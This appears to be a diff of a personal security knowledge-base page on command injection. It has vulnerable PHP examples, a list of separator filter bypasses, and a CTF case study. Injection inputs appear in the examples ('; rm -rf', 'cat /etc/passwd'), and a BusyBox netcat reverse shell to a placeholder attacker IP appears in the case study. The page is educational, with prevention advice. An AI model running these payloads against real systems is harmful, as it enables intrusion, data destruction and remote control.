@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:53 -->
+<!-- 2026-07-30 Thu 22:12 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Command Injection</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,23 +886,23 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org9f66d16">Command Injection</a>
+<li><a href="#orgdd8c979">Command Injection</a>
 <ul>
-<li><a href="#orgbd7756f">Explanation</a></li>
-<li><a href="#orgc4171ab">Command Injection vs. Code Injection</a></li>
-<li><a href="#org25db9ba">Examples of Command Injection</a></li>
-<li><a href="#org419e711">Command Separator Techniques and Filter Bypasses</a>
+<li><a href="#org99f6dd1">Explanation</a></li>
+<li><a href="#orge3bb502">Command Injection vs. Code Injection</a></li>
+<li><a href="#org46c5c34">Examples of Command Injection</a></li>
+<li><a href="#org90b8e96">Command Separator Techniques and Filter Bypasses</a>
 <ul>
-<li><a href="#orgba67ef3">Standard separators (commonly filtered)</a></li>
-<li><a href="#org2ddec65">Frequently missed separators (bypass candidates)</a></li>
+<li><a href="#org63bafbd">Standard separators (commonly filtered)</a></li>
+<li><a href="#org89d9a95">Frequently missed separators (bypass candidates)</a></li>
 </ul>
 </li>
-<li><a href="#orgf27ca56">Exploitation in Practice</a>
+<li><a href="#org074fb0b">Exploitation in Practice</a>
 <ul>
-<li><a href="#org0b0b878">Case: Health check / ping utility endpoint (see Dead Drop CTF)</a></li>
+<li><a href="#org21ccf76">Case: Health check / ping utility endpoint (see Dead Drop CTF)</a></li>
 </ul>
 </li>
-<li><a href="#orgd98dd15">Prevention</a></li>
+<li><a href="#org2dbc8e8">Prevention</a></li>
 </ul>
 </li>
 </ul>
@@ -893,16 +911,16 @@ pre {
 <p>
 Related: <a href="pentest/20260711T205041--dead-drop__ad_ctf_redo_web.html">Dead Drop</a>
 </p>
-<div id="outline-container-org9f66d16" class="outline-2">
-<h2 id="org9f66d16">Command Injection</h2>
-<div class="outline-text-2" id="text-org9f66d16">
+<div id="outline-container-orgdd8c979" class="outline-2">
+<h2 id="orgdd8c979">Command Injection</h2>
+<div class="outline-text-2" id="text-orgdd8c979">
 <p>
 Command injection is a severe cybersecurity vulnerability that allows an attacker to execute arbitrary commands on the host operating system through a vulnerable application. This occurs when an application incorporates unsafe user-supplied data directly into system-level commands without proper validation or sanitization.
 </p>
 </div>
-<div id="outline-container-orgbd7756f" class="outline-3">
-<h3 id="orgbd7756f">Explanation</h3>
-<div class="outline-text-3" id="text-orgbd7756f">
+<div id="outline-container-org99f6dd1" class="outline-3">
+<h3 id="org99f6dd1">Explanation</h3>
+<div class="outline-text-3" id="text-org99f6dd1">
 <p>
 At its core, command injection exploits the trust an application places in user input. When an application is designed to interact with the operating system (OS) using functions like <code>system()</code> or <code>exec()</code> in programming languages, and it uses user-provided data as part of the command, a vulnerability can arise. Attackers can then inject special characters (such as semicolons <code>;</code>, ampersands <code>&amp;</code>, or pipes <code>|</code> in Linux/Unix, or <code>&amp;</code> in Windows) that the operating system shell interprets as separators or command combiners. This allows the attacker to append and execute their own commands alongside the application's intended command.
 </p>
@@ -920,9 +938,9 @@ The malicious commands are typically executed with the same privileges as the vu
 </ul>
 </div>
 </div>
-<div id="outline-container-orgc4171ab" class="outline-3">
-<h3 id="orgc4171ab">Command Injection vs. Code Injection</h3>
-<div class="outline-text-3" id="text-orgc4171ab">
+<div id="outline-container-orge3bb502" class="outline-3">
+<h3 id="orge3bb502">Command Injection vs. Code Injection</h3>
+<div class="outline-text-3" id="text-orge3bb502">
 <p>
 While often confused, command injection differs from code injection. The key distinction lies in the execution context and the type of payload:
 </p>
@@ -933,9 +951,9 @@ While often confused, command injection differs from code injection. The key dis
 </ul>
 </div>
 </div>
-<div id="outline-container-org25db9ba" class="outline-3">
-<h3 id="org25db9ba">Examples of Command Injection</h3>
-<div class="outline-text-3" id="text-org25db9ba">
+<div id="outline-container-org46c5c34" class="outline-3">
+<h3 id="org46c5c34">Examples of Command Injection</h3>
+<div class="outline-text-3" id="text-org46c5c34">
 <p>
 Here are several illustrative examples of how command injection can occur:
 </p>
@@ -949,20 +967,20 @@ Here are several illustrative examples of how command injection can occur:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_1a9b8b5a983c4f9ba58527a82c479c39>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_af0df9bdfc674f4b99ff89a617c142b1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1a9b8b5a983c4f9ba58527a82c479c39=document.querySelector('button[name=btn_1a9b8b5a983c4f9ba58527a82c479c39]');
-copyBtnbtn_1a9b8b5a983c4f9ba58527a82c479c39.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<?php\nprint(\"Please specify the name of the file to delete\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"rm $file\"); // 'rm' is a command to delete files\n?>\n`);copyBtnbtn_1a9b8b5a983c4f9ba58527a82c479c39.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1a9b8b5a983c4f9ba58527a82c479c39.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1=document.querySelector('button[name=btn_af0df9bdfc674f4b99ff89a617c142b1]');
+copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<?php\nprint(\"Please specify the name of the file to delete\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"rm $file\"); // 'rm' is a command to delete files\n?>\n`);copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-php">&lt;?php
-print("Please specify the name of the file to delete");
-print("&lt;p&gt;");
-$file=$_GET['filename'];
-system("rm $file"); // 'rm' is a command to delete files
-?&gt;
+<pre class="src src-php"><span style="color: #ff7f86;">&lt;?php</span>
+<span style="color: #79a8ff;">print</span>(<span style="color: #2fafff;">"Please specify the name of the file to delete"</span>);
+<span style="color: #79a8ff;">print</span>(<span style="color: #2fafff;">"&lt;p&gt;"</span>);
+$<span style="color: #4ae2f0;">file</span>=$<span style="color: #4ae2f0;">_GET</span>[<span style="color: #2fafff;">'filename'</span>];
+system(<span style="color: #2fafff;">"rm </span><span style="color: #4ae2f0;">$file</span><span style="color: #2fafff;">"</span>); <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">'rm' is a command to delete files
+</span><span style="color: #ff7f86;">?&gt;</span>
 </pre>
 </div></div>
 
@@ -979,20 +997,20 @@ In this example, if a user provides <code>image.jpg; rm -rf /important-data</cod
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_1c05ec6da9f24a6180e9cb9660d321a4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_ec13a4438f4346db8d15f60f7e8336ef>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1c05ec6da9f24a6180e9cb9660d321a4=document.querySelector('button[name=btn_1c05ec6da9f24a6180e9cb9660d321a4]');
-copyBtnbtn_1c05ec6da9f24a6180e9cb9660d321a4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<?php\n$ip_address = $_GET[\"ip_address\"];\n$not_used = array();\n$return_code = 0;\nexec('ping -W 2 -c 1 ' . $ip_address, $not_used, $return_code);\n?>\n`);copyBtnbtn_1c05ec6da9f24a6180e9cb9660d321a4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1c05ec6da9f24a6180e9cb9660d321a4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef=document.querySelector('button[name=btn_ec13a4438f4346db8d15f60f7e8336ef]');
+copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<?php\n$ip_address = $_GET[\"ip_address\"];\n$not_used = array();\n$return_code = 0;\nexec('ping -W 2 -c 1 ' . $ip_address, $not_used, $return_code);\n?>\n`);copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-php">&lt;?php
-$ip_address = $_GET["ip_address"];
-$not_used = array();
-$return_code = 0;
-exec('ping -W 2 -c 1 ' . $ip_address, $not_used, $return_code);
-?&gt;
+<pre class="src src-php"><span style="color: #ff7f86;">&lt;?php</span>
+$<span style="color: #4ae2f0;">ip_address</span> = $<span style="color: #4ae2f0;">_GET</span>[<span style="color: #2fafff;">"ip_address"</span>];
+$<span style="color: #4ae2f0;">not_used</span> = <span style="color: #79a8ff;">array</span>();
+$<span style="color: #4ae2f0;">return_code</span> = 0;
+exec(<span style="color: #2fafff;">'ping -W 2 -c 1 '</span> . $<span style="color: #4ae2f0;">ip_address</span>, $<span style="color: #4ae2f0;">not_used</span>, $<span style="color: #4ae2f0;">return_code</span>);
+<span style="color: #ff7f86;">?&gt;</span>
 </pre>
 </div></div>
 
@@ -1010,16 +1028,16 @@ If an attacker provides <code>localhost; cat /etc/passwd</code> as the <code>ip_
 </ol>
 </div>
 </div>
-<div id="outline-container-org419e711" class="outline-3">
-<h3 id="org419e711">Command Separator Techniques and Filter Bypasses</h3>
-<div class="outline-text-3" id="text-org419e711">
+<div id="outline-container-org90b8e96" class="outline-3">
+<h3 id="org90b8e96">Command Separator Techniques and Filter Bypasses</h3>
+<div class="outline-text-3" id="text-org90b8e96">
 <p>
 Applications that attempt to defend against command injection often do so by blacklisting obvious separator characters. This defence is frequently incomplete, since shells recognise multiple ways to separate or chain commands beyond the "textbook" ones.
 </p>
 </div>
-<div id="outline-container-orgba67ef3" class="outline-4">
-<h4 id="orgba67ef3">Standard separators (commonly filtered)</h4>
-<div class="outline-text-4" id="text-orgba67ef3">
+<div id="outline-container-org63bafbd" class="outline-4">
+<h4 id="org63bafbd">Standard separators (commonly filtered)</h4>
+<div class="outline-text-4" id="text-org63bafbd">
 <ul class="org-ul">
 <li><code>;</code>    — sequential execution</li>
 <li><code>&amp;&amp;</code>   — execute second command only if first succeeds</li>
@@ -1029,9 +1047,9 @@ Applications that attempt to defend against command injection often do so by bla
 </ul>
 </div>
 </div>
-<div id="outline-container-org2ddec65" class="outline-4">
-<h4 id="org2ddec65">Frequently missed separators (bypass candidates)</h4>
-<div class="outline-text-4" id="text-org2ddec65">
+<div id="outline-container-org89d9a95" class="outline-4">
+<h4 id="org89d9a95">Frequently missed separators (bypass candidates)</h4>
+<div class="outline-text-4" id="text-org89d9a95">
 <ul class="org-ul">
 <li><b>Newline</b> (<code>\n</code> / <code>%0a</code> URL-encoded) — shells treat a newline as a command terminator just like <code>;</code>. Filters that block <code>;</code>, <code>&amp;&amp;</code>, and <code>|</code> but validate input as a single-line string often miss this entirely, especially when the payload is delivered through a proxy (e.g. Burp Repeater) where a literal newline can be inserted directly into the request body/parameter rather than typed as text.</li>
 <li><b>Backticks</b> (<code>`cmd`</code>) and <code>$(cmd)</code> — command substitution rather than a separator; executes and inlines output even when classic separator characters are stripped.</li>
@@ -1044,13 +1062,13 @@ Practical implication: when a target filters or strips the obvious separators, a
 </div>
 </div>
 </div>
-<div id="outline-container-orgf27ca56" class="outline-3">
-<h3 id="orgf27ca56">Exploitation in Practice</h3>
-<div class="outline-text-3" id="text-orgf27ca56">
+<div id="outline-container-org074fb0b" class="outline-3">
+<h3 id="org074fb0b">Exploitation in Practice</h3>
+<div class="outline-text-3" id="text-org074fb0b">
 </div>
-<div id="outline-container-org0b0b878" class="outline-4">
-<h4 id="org0b0b878">Case: Health check / ping utility endpoint (see Dead Drop CTF)</h4>
-<div class="outline-text-4" id="text-org0b0b878">
+<div id="outline-container-org21ccf76" class="outline-4">
+<h4 id="org21ccf76">Case: Health check / ping utility endpoint (see Dead Drop CTF)</h4>
+<div class="outline-text-4" id="text-org21ccf76">
 <p>
 A network health-check feature exposing a <code>ping</code> wrapper (see example 2 above) was found to filter standard separators (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>) but not raw newlines. Separating the legitimate ping argument from the injected command with a newline (inserted directly via Burp Suite rather than typed inline) achieved command execution where semicolon-based payloads were blocked.
 </p>
@@ -1060,11 +1078,11 @@ Once execution was confirmed, a pre-installed BusyBox netcat binary on the targe
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_025b3048b7714e1a839967b4a7e52e9d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7f79de58ea4449bd98d0f546cd084638>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_025b3048b7714e1a839967b4a7e52e9d=document.querySelector('button[name=btn_025b3048b7714e1a839967b4a7e52e9d]');
-copyBtnbtn_025b3048b7714e1a839967b4a7e52e9d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# attack machine — listener\nnc -lvnp <PORT>\n\n# injected payload (conceptual — newline separates ping arg from injected command)\n<ping_target>\nbusybox nc <ATTACKER_IP> <PORT> -e /bin/sh\n`);copyBtnbtn_025b3048b7714e1a839967b4a7e52e9d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_025b3048b7714e1a839967b4a7e52e9d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7f79de58ea4449bd98d0f546cd084638=document.querySelector('button[name=btn_7f79de58ea4449bd98d0f546cd084638]');
+copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# attack machine — listener\nnc -lvnp <PORT>\n\n# injected payload (conceptual — newline separates ping arg from injected command)\n<ping_target>\nbusybox nc <ATTACKER_IP> <PORT> -e /bin/sh\n`);copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1083,9 +1101,9 @@ Using an already-present utility (BusyBox) rather than dropping a new binary is 
 </div>
 </div>
 </div>
-<div id="outline-container-orgd98dd15" class="outline-3">
-<h3 id="orgd98dd15">Prevention</h3>
-<div class="outline-text-3" id="text-orgd98dd15">
+<div id="outline-container-org2dbc8e8" class="outline-3">
+<h3 id="org2dbc8e8">Prevention</h3>
+<div class="outline-text-3" id="text-org2dbc8e8">
 <p>
 The primary defense against command injection is rigorous input validation and sanitization. This includes:
 </p>
@@ -1107,6 +1125,20 @@ The primary defense against command injection is rigorous input validation and s
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1114,6 +1146,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
